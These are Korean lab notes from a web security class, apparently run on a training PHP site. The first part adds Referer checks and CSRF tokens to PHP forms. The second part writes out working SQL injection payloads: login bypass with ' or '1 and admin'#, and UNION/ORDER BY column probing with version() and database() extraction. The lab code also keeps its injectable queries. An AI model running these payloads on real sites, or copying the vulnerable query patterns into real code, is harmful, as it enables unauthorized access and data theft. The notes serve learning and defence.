# 10.21 Referer, SQL Injection, (Union,Order By, Substring, Ascii)



#### 회원 정보 방지

[root@Linux-04 바탕화면]# cd /var/www/html/member/

[root@Linux-04 member]# ls -l
합계 36

```
-rw-r--r-- 1 root root 3183 2017-06-10 21:43 member_info.php /WEB
-rw-r--r-- 1 root root  647 2017-06-10 21:43 member_info_change.php /WAS
-rw-r--r-- 1 root root 1291 2017-06-10 21:43 member_login.php /WEB
-rw-r--r-- 1 root root  955 2020-10-19 16:29 member_login_check.php /WAS
-rw-r--r-- 1 root root  354 2020-10-19 16:09 member_logout.php /WEB
-rw-r--r-- 1 root root 2881 2020-10-20 18:08 member_nick.php /WEB
-rw-r--r-- 1 root root 1800 2020-10-20 18:11 member_nick_change.php /WAS
-rw-r--r-- 1 root root 3353 2017-06-10 21:43 member_register.php /WEB
-rw-r--r-- 1 root root  863 2017-06-10 21:43 member_register_ok.php /WAS
```



##### 방법 1 (Referer 을 이용하기)

[root@Linux-04 member]# vim member_info_change.php

```
<?php
                session_start();
                require "../dbconn.php";

                $pw1=$_POST["user_pw1"];
                $pw2=$_POST["user_pw2"];
                $age=$_POST["age"];
                $nick=$_POST["nick"];
                $email=$_POST["email"];

                if($_SERVER['HTTP_REFERER'] == "" || $_SERVER['HTTP_REFERER'] != "http://172.16.10.20/member/member_info.php")
                {
                        echo "<script>alert('요청하신 경로가 올바르지 않습니다');
                                history.back();</script>";
                        exit;
                }

                if(!$nick) $nick=$_SESSION[nickname];

                $strSQL = "update member set nickname='$nick' ";

                if($pw1) $strSQL .= ", u_pass='$pw1'";
                if($age) $strSQL .= ", age=$age";
                if($email) $strSQL .= ", email='$email'";

                $strSQL .= " where u_id='$_SESSION[user_id]'";
                $rs = mysql_query($strSQL);
                if($rs){
                        $_SESSION[nickname]=$nick;
                        header("Location: member_info.php?ch=1");
                }else{
                        header("Location: member_info.php?ch=2");
                }

?>

```

- 추가 한 부분들

  ```
  if($_SERVER['HTTP_REFERER'] == "" || $_SERVER['HTTP_REFERER'] != "http://172.16.10.20/member/member_info.php")
                  {
                          echo "<script>alert('요청하신 경로가 올바르지 않습니다');
                                  history.back();</script>";
                          exit;
                  }
  ```

  

##### 방법 2 (hidden token을 이용하기)

[root@Linux-04 member]# vim member_info.php

```
<!doctype html>
<html>
        <!-- head 부분 -->
        <head> 
                <!-- 상단 title -->
                <title>회원 정보</title>
                <!-- CSS Style 지정 -->
                <link rel="stylesheet" href="../style_contents.css" type="text/css">
                <script>
                        function ck(){  
                                if(!document.mform.user_pw1.value == "" && document.mform.user_pw1.value.length < 6 || document.mform.user_pw1.value.length > 20){
                                        alert("비밀번호를 다시 입력하세요.");
                                        mform.user_pw1.focus();
                                        return false;
                                }
                                if(document.mform.user_pw1.value != document.mform.user_pw2.value){
                                        alert("비밀번호가 일치하지 않습니다.");
                                        mform.user_pw2.focus();
                                        return false;
                                }
                                document.mform.submit();
                        }
                </script>       
        <?
                function csrf_token_create($max_len = 10){
                        $chars = "0123456789abcdefghijklmnopqrxtuvwxyz";
                        $len = strlen($chars);
                        $rand_str = '';
                        for ($i=0; $i<$max_len; $i++)
                        {
                                $rand_str .= $chars[mt_rand(0,$len-1)];
                        }
                        return $rand_str;
                }
        ?>
        </head>
        <body>
                <!-- 화면 상단 header 부분 -->
                        <iframe src="../head.php" id="bodyFrame" name="body" width="100%" frameborder="0"></iframe>
                <!-- 화면 하단 body 부분 -->
                <div id="info_contents" class="contents">
                <?php
                        session_start();
                        if(!$_SESSION[user_id]){
                                echo "<script>
                                        alert('로그인 후 이용하세요!');
                                        location.replace('member_login.php')</script>";
                                exit;
                  }

                        require "../dbconn.php";
                        $strSQL="select * from member where u_id='$_SESSION[user_id]'";
                        $rs = mysql_query($strSQL);
                        $rs_arr = mysql_fetch_array($rs);

                        if($_GET[ch]==1)
                                echo "<h5>성공적으로 변경되었습니다.</h5>";
                        else if($_GET[ch]==2)
                                echo "<h5>회원정보를 변경하지 못하였습니다.</h5>";

                        $token = csrf_token_create();
                        $_SESSION['token'] = $token;
                ?>
                        <form name="mform" method="post" action="member_info_change.php">
                        <table width="500" cellpadding="3" class="grayColor">
                                <tr>
                                <th colspan="2" style="background-color: #323232" >
                                        <font style="color: white; font-size: 150%;" >회 원 정 보</font>
                                </th>
                                </tr>
                                <tr>
                                        <th width="120px"><font>*ID</font></th>
                                        <td><?=$rs_arr[u_id]?></td>
                                </tr>
                                <tr>
                                        <th><font>*이   름</font></th>
                                        <td><?=$rs_arr[u_name]?></td>
                                </tr>
                                <tr>
                                        <th><font>*비밀번호</font></th>
                                        <td>
                                                <input type="password" name="user_pw1" size="20" maxlength="20">
                                                &nbsp;<font style="color:red;">6~20(영문/숫자/특수문자)</font>
                                        </td>
                                </tr>

                                <tr>
                                        <th><font>*비밀번호 확인</font></th>
                                        <td><input type="password" name="user_pw2" size="20" maxlength="20"></td>
                                </tr>
                                <tr>
                                        <th><font>나이</font></th>
                                        <td><input type="number" name="age" size="30" min="0" max="150" value=<?=$rs_arr[age]?>></td>
                                </tr>
                                 <tr>
                                        <th><font>닉네임</font></th>
                                        <td><input type="text" name="nick" size="30" maxlength="30" value=<?=$rs_arr[nickname]?>></td>
                                </tr>
                                <tr>
                                        <th><font>EMAIL</font></th>
                                        <td><input type="text" name="email" size="30" maxlength="30" value=<?=$rs_arr[email]?>></td>
                                        <input type="hidden" name="token" value=<?=$token?>></td>
                                </tr>
                        </table>
                        <p>
                                <font size=2>* 는 필수 입력 항목입니다.</font><br/><br/>
                                <input type="button" value="수정" onclick="ck();" class="btn_default btn_gray" >
                                <input type="reset" value="삭제" class="btn_default btn_gray" >
                        </p>
                </form>
                </div>
        </body>
</html>



```

- 추가한 부분들

```
<?
                function csrf_token_create($max_len = 10){
                        $chars = "0123456789abcdefghijklmnopqrxtuvwxyz";
                        $len = strlen($chars);
                        $rand_str = '';
                        for ($i=0; $i<$max_len; $i++)
                        {
                                $rand_str .= $chars[mt_rand(0,$len-1)];
                        }
                        return $rand_str;
                }
        ?>




$token = csrf_token_create();
                        $_SESSION['token'] = $token;




                                        <input type="hidden" name="token" value=<?=$token?>></td>

```



다시 돌아와서

[root@Linux-04 member]# vim member_info_change.php

토큰 추가해줬음

```
<?php
                session_start();
                require "../dbconn.php";

                $pw1=$_POST["user_pw1"];
                $pw2=$_POST["user_pw2"];
                $age=$_POST["age"];
                $nick=$_POST["nick"];
                $email=$_POST["email"];
                $token=$_POST["token"];

                if($_SESSION['token'] != $token)
                {
                        echo"<script>alert('토큰 값이 일치하지 않습니다');history.back();</script>";
                        exit;
                }

                if($_SERVER['HTTP_REFERER'] == "" || $_SERVER['HTTP_REFERER'] != "http://172.16.10.20/member/member_info.php") 
                {
                        echo "<script>alert('요청하신 경로가 올바르지 않습니다');
                                history.back();</script>";
                        exit;
                }
                
                if(!$nick) $nick=$_SESSION[nickname];

                $strSQL = "update member set nickname='$nick' ";

                if($pw1) $strSQL .= ", u_pass='$pw1'";
                if($age) $strSQL .= ", age=$age";
                if($email) $strSQL .= ", email='$email'"; 

                $strSQL .= " where u_id='$_SESSION[user_id]'";
                $rs = mysql_query($strSQL);
                if($rs){
                        $_SESSION[nickname]=$nick;
                        header("Location: member_info.php?ch=1");
                }else{
                        header("Location: member_info.php?ch=2");
                }

?>

```



#### 게시판

[root@Linux-04 member]# cd ../board/
[root@Linux-04 board]# ls -l

```
합계 28
-rw-r--r-- 1 root root  714 2017-06-10 21:43 board_delete_ok.php
-rw-r--r-- 1 root root  388 2017-06-10 21:43 board_file_download.php
-rw-r--r-- 1 root root 3445 2017-06-10 21:43 board_list.php
-rw-r--r-- 1 root root 3405 2017-06-10 21:43 board_view.php
-rw-r--r-- 1 root root 3324 2017-06-10 21:43 board_write.php
-rw-r--r-- 1 root root 3108 2020-10-20 11:25 board_write_ok.php
drwxr-xr-x 2 root root 4096 2017-06-10 21:43 upload


```

##### [root@Linux-04 board]# vim board_write_ok.php

```
<?php

        $b_name=$_POST["name"];
        $b_pw=$_POST["pw"];
        $b_email=$_POST["email"];
        $b_sub=$_POST["sub"];
        $b_cont=$_POST["cont"];
        $b_tag=$_POST["tag"];

        //str_replace("검색 문자열", "변경 문자열", "검색 대상");
        //$b_cont = str_replace("<script>","",$b_cont);
        //preg_replace("/검색문자열/옵션","변경분자열","검색대상");
        //$b_cont = preg_replace("/</i","&lt;",$b_cont);
        //strip_tags("검색대상","사용할태그"); -> 사용할 태그를 제외한 나머지 태그를 제거 
        //$b_cont = strip_tags($b_cont,'<h1><a>');


        // html 사용안하는 게시글은 html encoding 처리
        if($b_tag == "F"){
                //$b_cont = htmlspecialchars($b_cont);
                $b_cont = htmlentities($b_cont);
        }

        if($_SERVER['HTTP_REFERER'] == "" || $_SERVER['HTTP_REFERER'] != "http://172.16.10.20/board/board_write.php")
        {
                echo"<script>alert('요청하신 경로가 올바르지 않습니다.');history.back();</script>";
                exit;
        }       

        // file 정보 받기
        // $_FILES : form 에서 file type으로 넘어오면 여러가지 정보가 넘어오는데 이런 정보를 받아주는 슈퍼글로벌 변수
        $f_error=$_FILES["att_file"]["error"];
        if($f_error==0){
                $f_name=$_FILES["att_file"]["name"];
                $f_path="upload/".$f_name;
                $f_tmp=$_FILES["att_file"]["tmp_name"];
                $f_size=$_FILES["att_file"]["size"];

                // 같은 이름의 파일이 있을 경우 이름 뒤에 숫자 붙이기
                $f_name_only=substr($f_name,0,strrpos($f_name,'.'));    // 파일이름 중 확장자를 제외한 이름
                $f_name_ext=substr($f_name,strrpos($f_name,'.'));       // 파일이름 중 확장자

                for($i=1; is_file($f_path); $i++){      // 같은 이름의 파일이 있으면 i 값을 1씩 증가시키며 반복
                        $f_name_only=$f_name_only."(".$i.")";   // 파일이름 뒤에 (번호) 추가
                        $f_path="./upload/".$f_name_only.$f_name_ext;   // 파일 경로 재설정
                }
                $f_rename = $f_name_only.$f_name_ext;   //파일이름과 확장자 다시 합치기

        }else if($f_error!=4){
        	echo "<script>alert('파일 업로드 실패($f_error)');
                        history.back();</script>";
                        exit;
        }
        /*
         echo "file error:".$_FILES['attachFile']['error'];
        ************ 오류 코드 ***************************
         0 : 성공
         1 : php.ini 의 upload_max_filesize 보다 큽니다.
         2 : html 폼에서 지정한  max file size 보다 큽니다.
         3 : 파일이 일부분만 전송되었습니다.
         4 : 파일이 전송되지 않았습니다.
         6 : 임시 폴더가 없습니다.
         7 : 디스크에 파일 쓰기를 실패하였습니다.
         8 : 확장에 의해 파일 업로드가 중지되었습니다.
        *************************************************
        */

        require "../dbconn.php";

        $strSQL="insert into board set strName='$b_name', strPassword='$b_pw', strEmail='$b_email', ";
        $strSQL.="strSubject='$b_sub', strContent='$b_cont', htmlTag='$b_tag',writeDate=now() ";
        if($f_error==0)
        {
                $strSQL.=", filename='$f_rename', filesize='$f_size'";
                $f_rs = move_uploaded_file($f_tmp, $f_path);
        }

        $rs = mysql_query($strSQL);
        if($rs){
                echo "<script>alert('글이 성공적으로 등록 되었습니다.');
                        location.replace('board_list.php');</script>";
        }else{
                echo "<script>alert('글을 등록하는데 실패하였습니다.');
                        history.back();</script>";
        }

?>


```

- 추가해준 부분

  ```
   if($_SERVER['HTTP_REFERER'] == "" || $_SERVER['HTTP_REFERER'] != "http://172.16.10.20/board/board_write.php")
          {
                  echo"<script>alert('요청하신 경로가 올바르지 않습니다.');history.back();</script>";
                  exit;
          }       
  
  
  ```

-> 테스트는 관리자님 도와주세요 로 확인 -> FORWARD 누르면 오청하신 경로가 올바르지 않습니다 뜸



##### [root@Linux-04 board]# vim board_write.php

```
<!doctype html>
<html>
        <!-- head 부분 -->
        <head>
                <!-- 상단 title -->
                <title>게시판</title>
                <!-- CSS Style 지정 -->
                <link rel="stylesheet" href="../style_contents.css" type="text/css">
                <script>
                        function ck(){
                                if(document.wform.name.value == ""){
                                        alert("이름을 입력해 주세요.");
                                        document.wform.name.focus();
                                        return false;
                                }
                                if(document.wform.pw.value == ""){
                                        alert("비밀번호를 입력해 주세요.");
                                        document.wform.pw.focus();
                                        return false;
                                }
                                if(document.wform.sub.value == ""){
                                        alert("제목을 입력해 주세요.");
                                        document.wform.sub.focus();
                                        return false;
                                }
                                if(document.wform.cont.value == ""){
                                        alert("내용을 입력해 주세요.");
                                        document.wform.cont.focus();
                                        return false;
                                }
                                document.wform.submit();
                        }
                </script>
                <?php
                        function csrf_token_create($max_len = 10){
                                $chars = "abcdefghijklmnopqrxtuvwxyz0123456789";
                                $len = strlen($chars);
                                $rand_str = '';

                                for ($i=0;$i<$max_len;$i++)
                                {
                                        $rand_str .= $chars[mt_rand(0,$len-1)];
                                }
                                return $rand_str;
                        }
                ?>
        </head>
        <body>
                <!-- 화면 상단 header 부분 -->
                <iframe src="../head.php" id="bodyFrame" name="body" width="100%" frameborder="0"></iframe>
                <!-- 화면 하단 body 부분 -->
                <div id="board_contents" class="contents">
                        <?php
                                session_start();
                                if($_SESSION[user_id]){
                                        require "../dbconn.php";
                                        $strSQL="select u_name,email from member where u_id='$_SESSION[user_id]'";
                                        $rs = mysql_query($strSQL);
                                        $rs_arr = mysql_fetch_array($rs);
                                        $name = $rs_arr[u_name];
                                        $email = $rs_arr[email];
                                }

                                $token = csrf_token_create();
                                $_SESSION['csrf_token'] = $token;
                        ?>
                        <form name="wform" method="post" action="board_write_ok.php" enctype="multipart/form-data">
                                <table width="600" class="grayColor">
                                        <tr>
                                                <th colspan="5" style="background-color: #323232" >
                                                        <font style="color: white; font-size: 150%;" >게 시 글 작 성</font>
                                                </th>
                                        </tr>
                                        <tr>
                                                <th width="100"><font>이  름</font></th>
                                                <td><input type="text" name="name" size="11" value="<?=$name;?>"></td>
                                        </tr>
                                        <tr>
                                                <th><font>비밀번호</font></th>
                                                <td><input type="password" name="pw" size="12"></td>
                                        </tr>
                                        <tr>
                                                <th><font>이메일</font></th>
                                                <td colspan="3"><input type="text" name="email" size="40" value="<?=$email;?>"></td>
                                        </tr>

                                        <tr>
                                                <th><font>제  목</font></th>
                                                <td colspan="3"><input type="text" name="sub" size="40"></td>
                                        </tr>
                                        <tr>
                                                <th><font>HTML적용</font></th>
                                                <td colspan="3">
                                                        <input type="radio" name="tag" value="T" checked><font size="3">적용</font>
                                                        <input type="radio" name="tag" value="F"><font size="3">비적용</font>
                                                </td>
                                                </tr>
                                        <tr>
                                                <th><font>내  용</font></th>
                                                <td colspan="3" align="center"><textarea name="cont" cols="60" rows="10" style="border: 0px;"></textarea></td>
                                                <input type="hidden" name="token" value=<?=$token?>></td>
                                        </tr>
                                        <tr>
                                                <th><font>파일첨부</font></th>
                                                <td colspan="3"><input type="file" name="att_file"><font size="2">&nbsp;&nbsp;(최대 4MB)</font></td>
                                        </tr>
                                </table>
                        </form>

                        <p align="center">
                                <input type="button" value="등록" class="btn_default btn_gray" onclick='ck();'>
                                <input type="reset" value="다시작성" class="btn_default btn_gray" >
                                <input type="button" value="목록" class="btn_default btn_gray" onclick="location.replace('board_list.php');">
                        </p>
                </div>
        </body>
</html>


```



- 추가 한 부분

  ```
   <?php
                          function csrf_token_create($max_len = 10){
                                  $chars = "abcdefghijklmnopqrxtuvwxyz0123456789";
                                  $len = strlen($chars);
                                  $rand_str = '';
  
                                  for ($i=0;$i<$max_len;$i++)
                                  {
                                          $rand_str .= $chars[mt_rand(0,$len-1)];
                                  }
                                  return $rand_str;
                          }
                  ?>
  
  
  
  
    $token = csrf_token_create();
                                  $_SESSION['csrf_token'] = $token;
  
  
                                                  <input type="hidden" name="token" value=<?=$token?>></td>
  
  
  ```



##### [root@Linux-04 board]# vim board_write_ok.php

```
<?php
		
        session_start();


        $b_name=$_POST["name"];
        $b_pw=$_POST["pw"];
        $b_email=$_POST["email"];
        $b_sub=$_POST["sub"];
        $b_cont=$_POST["cont"];
        $b_tag=$_POST["tag"];
        $token=$_POST["token"];

        //str_replace("검색 문자열", "변경 문자열", "검색 대상");
        //$b_cont = str_replace("<script>","",$b_cont);
        //preg_replace("/검색문자열/옵션","변경분자열","검색대상");
        //$b_cont = preg_replace("/</i","&lt;",$b_cont);
        //strip_tags("검색대상","사용할태그"); -> 사용할 태그를 제외한 나머지 태그를 제거 
        //$b_cont = strip_tags($b_cont,'<h1><a>');


        // html 사용안하는 게시글은 html encoding 처리
        if($b_tag == "F"){
                //$b_cont = htmlspecialchars($b_cont);
                $b_cont = htmlentities($b_cont);
        }

        if($_SESSION['csrf_token'] != $token){
                echo"<script>alert('토큰 값이 일치하지 않습니다.');history.back();</script>";
                exit;
        }

        if($_SERVER['HTTP_REFERER'] == "" || $_SERVER['HTTP_REFERER'] != "http://172.16.10.20/board/board_write.php")
        {
                echo"<script>alert('요청하신 경로가 올바르지 않습니다.');history.back();</script>";
                exit;
        }

        // file 정보 받기
        // $_FILES : form 에서 file type으로 넘어오면 여러가지 정보가 넘어오는데 이런 정보를 받아주는 슈퍼글로벌 변수
        $f_error=$_FILES["att_file"]["error"];
        if($f_error==0){
                $f_name=$_FILES["att_file"]["name"];
                $f_path="upload/".$f_name;
                $f_tmp=$_FILES["att_file"]["tmp_name"];
                $f_size=$_FILES["att_file"]["size"];

                // 같은 이름의 파일이 있을 경우 이름 뒤에 숫자 붙이기
                $f_name_only=substr($f_name,0,strrpos($f_name,'.'));    // 파일이름 중 확장자를 제외한 이름
                $f_name_ext=substr($f_name,strrpos($f_name,'.'));       // 파일이름 중 확장자

                for($i=1; is_file($f_path); $i++){      // 같은 이름의 파일이 있으면 i 값을 1씩 증가시키며 반복
						 $f_name_only=$f_name_only."(".$i.")";   // 파일이름 뒤에 (번호) 추가
                        $f_path="./upload/".$f_name_only.$f_name_ext;   // 파일 경로 재설정
                }
                $f_rename = $f_name_only.$f_name_ext;   //파일이름과 확장자 다시 합치기

        }else if($f_error!=4){
                echo "<script>alert('파일 업로드 실패($f_error)');
                        history.back();</script>";
                        exit;
        }
        /*
         echo "file error:".$_FILES['attachFile']['error'];
        ************ 오류 코드 ***************************
         0 : 성공
         1 : php.ini 의 upload_max_filesize 보다 큽니다.
         2 : html 폼에서 지정한  max file size 보다 큽니다.
         3 : 파일이 일부분만 전송되었습니다.
         4 : 파일이 전송되지 않았습니다.
         6 : 임시 폴더가 없습니다.
         7 : 디스크에 파일 쓰기를 실패하였습니다.
         8 : 확장에 의해 파일 업로드가 중지되었습니다.
        *************************************************
        */

        require "../dbconn.php";

        $strSQL="insert into board set strName='$b_name', strPassword='$b_pw', strEmail='$b_email', ";
        $strSQL.="strSubject='$b_sub', strContent='$b_cont', htmlTag='$b_tag',writeDate=now() ";
        if($f_error==0)
        {
                $strSQL.=", filename='$f_rename', filesize='$f_size'";
                $f_rs = move_uploaded_file($f_tmp, $f_path);
        }

        $rs = mysql_query($strSQL);
        if($rs){
                echo "<script>alert('글이 성공적으로 등록 되었습니다.');
                        location.replace('board_list.php');</script>";
        }else{
                echo "<script>alert('글을 등록하는데 실패하였습니다.');
                        history.back();</script>";
        }

?>
                                                             
```



- 추가 한 부분

  ```
               session_start();
  
       
       $token=$_POST["token"];
  
  
   if($_SESSION['csrf_token'] != $token){
                  echo"<script>alert('토큰 값이 일치하지 않습니다.');history.back();</script>";
                  exit;
          }
  
  
  
  ```

  

### SQL Injection (99p)

[root@Linux-04 board]# mysql 

```
mysql> use WebTest;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select * from board where strNumber=42;
+-----------+---------+-------------+---------------+--------------------------------------+------------+---------+-----------+----------+----------+---------------------+
| strNumber | strName | strPassword | strEmail      | strSubject                           | strContent | htmlTag | viewCount | filename | filesize | writeDate           |
+-----------+---------+-------------+---------------+--------------------------------------+------------+---------+-----------+----------+----------+---------------------+
|        42 | 해커    | 1234        | hacker@kh.com | 토큰 테스트[board_write_ok.php]      | test       | T       |         2 | NULL     |     NULL | 2020-10-21 11:40:23 |
+-----------+---------+-------------+---------------+--------------------------------------+------------+---------+-----------+----------+----------+---------------------+
1 row in set (0.00 sec)

mysql> select * from board where strNumber=42 and 1=1;
+-----------+---------+-------------+---------------+--------------------------------------+------------+---------+-----------+----------+----------+---------------------+
| strNumber | strName | strPassword | strEmail      | strSubject                           | strContent | htmlTag | viewCount | filename | filesize | writeDate           |
+-----------+---------+-------------+---------------+--------------------------------------+------------+---------+-----------+----------+----------+---------------------+
|        42 | 해커    | 1234        | hacker@kh.com | 토큰 테스트[board_write_ok.php]      | test       | T       |         2 | NULL     |     NULL | 2020-10-21 11:40:23 |
+-----------+---------+-------------+---------------+--------------------------------------+------------+---------+-----------+----------+----------+---------------------+
1 row in set (0.00 sec)

```



즉 http://172.16.10.20/board/board_view.php?num=42 와 http://172.16.10.20/board/board_view.php?num=42 and 1=1 하는거랑 똑같은 게시글이 뜨는건 조작이 가능하다는 것



[root@Linux-04 board]# cd ../member

```
[root@Linux-04 member]# ls -l 
합계 36
-rw-r--r-- 1 root root 3592 2020-10-21 10:20 member_info.php
-rw-r--r-- 1 root root 1077 2020-10-21 10:22 member_info_change.php
-rw-r--r-- 1 root root 1291 2017-06-10 21:43 member_login.php
-rw-r--r-- 1 root root  955 2020-10-19 16:29 member_login_check.php
-rw-r--r-- 1 root root  354 2020-10-19 16:09 member_logout.php
-rw-r--r-- 1 root root 2881 2020-10-20 18:08 member_nick.php
-rw-r--r-- 1 root root 1800 2020-10-20 18:11 member_nick_change.php
-rw-r--r-- 1 root root 3353 2017-06-10 21:43 member_register.php
-rw-r--r-- 1 root root  863 2017-06-10 21:43 member_register_ok.php
```

[root@Linux-04 member]# vim member_login_check.php

```

```



#### ' or '1 로그인

칼리 홈페이지에서 로그인할때

```
ID : ' or '1
PW : ' or '1

-> 하면 1번째 계정으로 로그인 된다...
```



#### SQL (WAS 인증 우회)

```
mysql> use WebTest;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select * from member where 1;
+----+---------+------------+-----------+-----------+------+---------------+---------------------+
| no | u_id    | u_pass     | u_name    | nickname  | age  | email         | reg_date            |
+----+---------+------------+-----------+-----------+------+---------------+---------------------+
|  1 | tester  | qwer1234   | 테스터    | 멍청이    |   30 | admine@kh.com | 2020-10-16 17:04:50 |
|  2 | admin   | P@ssw0rd   | 관리자    | 관리자    |    0 |               | 2020-10-16 17:04:50 |
|  3 | easy    | 12         |           | 이지      | NULL | NULL          | 0000-00-00 00:00:00 |
|  4 | hacker  | keroro2424 | 해커      | 해커#2    |   30 | hacker@kh.com | 2020-10-20 10:29:10 |
+----+---------+------------+-----------+-----------+------+---------------+---------------------+
4 rows in set (0.00 sec)

mysql> select * from member where u_id='admin' and u_pass='P@ssw0rd';
+----+-------+----------+-----------+-----------+------+-------+---------------------+
| no | u_id  | u_pass   | u_name    | nickname  | age  | email | reg_date            |
+----+-------+----------+-----------+-----------+------+-------+---------------------+
|  2 | admin | P@ssw0rd | 관리자    | 관리자    |    0 |       | 2020-10-16 17:04:50 |
+----+-------+----------+-----------+-----------+------+-------+---------------------+
1 row in set (0.00 sec)

mysql> select * from member where 0 or 1 and 0 or 1;  
+----+---------+------------+-----------+-----------+------+---------------+---------------------+
| no | u_id    | u_pass     | u_name    | nickname  | age  | email         | reg_date            |
+----+---------+------------+-----------+-----------+------+---------------+---------------------+
|  1 | tester  | qwer1234   | 테스터    | 멍청이    |   30 | admine@kh.com | 2020-10-16 17:04:50 |
|  2 | admin   | P@ssw0rd   | 관리자    | 관리자    |    0 |               | 2020-10-16 17:04:50 |
|  3 | easy    | 12         |           | 이지      | NULL | NULL          | 0000-00-00 00:00:00 |
|  4 | hacker  | keroro2424 | 해커      | 해커#2    |   30 | hacker@kh.com | 2020-10-20 10:29:10 |
+----+---------+------------+-----------+-----------+------+---------------+---------------------+
4 rows in set (0.00 sec)

/// or 이랑 and 랑 있으면 and 먼저 처리
 0 or 1 and 0 or 1 -> 1 and 0  = 거짓 = 0 -> 0 or 0 or 1; -> 0 or 0 = 0 -> 0 or 1 -> 1
 where 절의 조건의 참이라면 => 모든 행 반환
 즉 select * from member where 0 or 1 and 0 or 1; 은 select * from member where 1; 이랑 같다.
 

```



##### 과정

```
 ID : ' or '1
 PW : ' or '1
 
select * from member where u_id='$id' and u_pass='$pw';
select * from member where u_id='admin' and u_pass='P@ssw0rd'; -> 관계 연산자 처리
select * from member where u_id=" or '1'and u_pass="or '1'; -> and가 더 우선순위가 높음
select * from member where 0 or 1 and 0 or 1; -> 오른 쪽 부터 처리
select * from member where 0 or 0 or 1;
select * from member where 0 or 1;
select * from member where 1; -> 모든 행 반환

```

이번엔 내가 원하는 아이디로 로그인 하는 법

```
ID : admin'#
PW : 1234 [아무거나]

select * from member where u_id='$id' and u_pass='$pw';
select * from member where u_id='admin'#' and u_pass='P@ssw0rd'; -> #은 한줄 주석
select * from member where u_id='admin';


ex. root 로 로그인 하려면 root'# 비번 암거나 쳐도 됨
```



### trim

' or '1 으로 로그인 했을 때 

```
user_id=%27+or+%271&user_pw=P%40ssw0rd

-> + 는 공백이다
즉 공백이 +로 갔다.
```



이걸 막아볼거야

[root@Linux-04 member]# vim member_login_check.php

```
                $id=trim($_REQUEST["user_id"]);
                $pw=trim($_REQUEST["user_pw"]);

원래 trim 없는데 trim 넣어주는거야
```

다시 칼리에서 ' or '1 으로 로그인 해보기

```
user_id=%27+or+%271&user_pw=P%40ssw0rd

-> + 는 공백이다
즉 공백이 +로 갔다.
```

-> 근데 공백 제거해도 로그인 됨...ㅎㅎ;





#### 완전한 로직으로 다시 구성해보기

[root@Linux-04 member]# vim member_login_check.php

```
<?php
                session_start();
                require "../dbconn.php";

                $id=$_REQUEST["user_id"];
                $pw=$_REQUEST["user_pw"];

                if($id=="" && $pw==""){
                        echo "<script>
                                alert('아이디와 패스워드를 모두 입력해주세요.');
                                history.back();
                                </script>";
                        exit();
                }

                $strSQL="select * from member where u_id='".$id."' and u_pass='".$pw."';";
                $rs=mysql_query($strSQL,$conn);
                $rs_arr=mysql_fetch_array($rs);
                mysql_close($conn);

                if($rs_arr['u_id'] == $id && $rs_arr['u_pass'] == $pw){ ///// 이 부분 추가해줌
                //if($rs_arr){    // 여기 //처리 해주고
                        $_SESSION[user_id]=$rs_arr[u_id];
                        $_SESSION[nickname]=$rs_arr[nickname];

                        session_regenerate_id();                        
                        #setcookie("쿠키이름","쿠키값","만료시간","경로");
                        #setcookie("addcookie","P@ssw0rd",time() + 3600,"/");

                        echo "<script>
                                alert('로그인 되었습니다.');
                                location.replace('../index.php');
                                </script>";
                }
                else{
                        echo "<script>
                                alert('아이디 또는 패스워드가 일치하지 않습니다.');
                                history.back();
                                </script>";
                }
?>

```



===> 이렇게 하면 ' or '1 이나 admin'# 로 더이상 로그인 안됨



### SQL Intection 분류 (112p)



알아오는 순서

DBMS 종류/버전 -> DB -> table -> column -> value

#### Union

컬럼 갯수가 똑같아야 Union을 사용 할 수 있다. 

사이트 폐쇄 게시글 기준

Select * from board where no =38 union select x,x,x,(컬럼갯수)

주소창에 172.16.10.20/board/board_view.php?num=38 union select NULL,NULL # 하면 암것도 안나옴 = 쿼리에서 받아온게 없다는 뜻

컬럼 갯수에 맞게 NULL 값을 늘리면 게시글이 뜬다. 

즉 정리하자면

```
172.16.10.20/board/board_view.php?num=38 -> select * from board where strNumber=24 이랑 같은 뜻
172.16.10.20/board/board_view.php?num=38 union select NULL # -> 반환 값 없음 / 이렇게 해서 안나온다면 board의 컬럼수가 2개 이상이라는 뜻
172.16.10.20/board/board_view.php?num=38 union select NULL NULL # -> 이렇게 늘리면서 찾는거임
.
.
.
http://172.16.10.20/board/board_view.php?num=38%20union%20select%20NULL,NULL,NULL%20,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL# => 하면 딱 나옴
테이블의 컬럼수가 11개라 NULL 11개 넣었을 때 나온거임
[%20 = 공백임~~~]

```

=> 컬럼의 갯수가 많을경우는...?



#### ORDER BY (120p)



```
http://172.16.10.20/board/board_view.php?num=38%20order%20by%2010#
--> 하면 나와 그럼 10개 이상이라는거

http://172.16.10.20/board/board_view.php?num=38%20order%20by%2020#
--> 하면 안나와 그럼 20개 미만이라는거

이런식으로 이분법으로 찾는거임 컬럼갯수를
http://172.16.10.20/board/board_view.php?num=38%20order%20by%2011# => 하면 나와 왜? 컬럼갯수 11개니까~



172.16.10.20/board/board_view.php?num=-1 union select 1,2,3,4,5,6,7,8,9,10,11 # 
-1 번의 게시글번호는 없으니까 -1을 넣고 union select 1,2,~11 # 이렇게 검색하면 컬럼 순서에 따라 숫자가 들어감

http://172.16.10.20/board/board_view.php?num=-1%20union%20select%201,version(),3,4,5,6,7,8,9,10,11%20#
=> mysql 버전이 이름 칸에 뜬다.
```



- DBMS 종류/버전 -> DB -> table -> column -> value

- DBMS 종류/버전 -> select version (); => MY - SQL
  - Union select 1,version(),3,4,5,6,7,8,9,10,11;  = 2번째 컬럼에 my-sql 버전 정보가 나옴



- DB -> select database();  -> WAS 에서 접근한 DB 명만 출력

  - Union select 1,version(),3,4,5,6,7,8,9,10,database() # -> 등록일 컬럼에 WebTest가 나온다. 이 디비가 WebTest 디비 이기 때문

    [http://172.16.10.20/board/board_view.php?num=-1%20Union%20select%201,version(),3,4,5,6,7,8,9,10,database()%20#]





#### 테이블 명을 알아보자

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| WebTest            |
| mysql              |
| test               |
+--------------------+
4 rows in set (0.00 sec)

mysql> select table_schema, table_name from information_schema.tables 
    -> where table_schema='WebTest';
+--------------+------------+
| table_schema | table_name |
+--------------+------------+
| WebTest      | board      |
| WebTest      | member     |
+--------------+------------+
2 rows in set (0.00 sec)


```



레코드가 여러 개인 경우 반복문이 적용 된 injection vector를 찾아야한다. 

http://172.16.10.20/board/board_list.php?keyword='키워드'

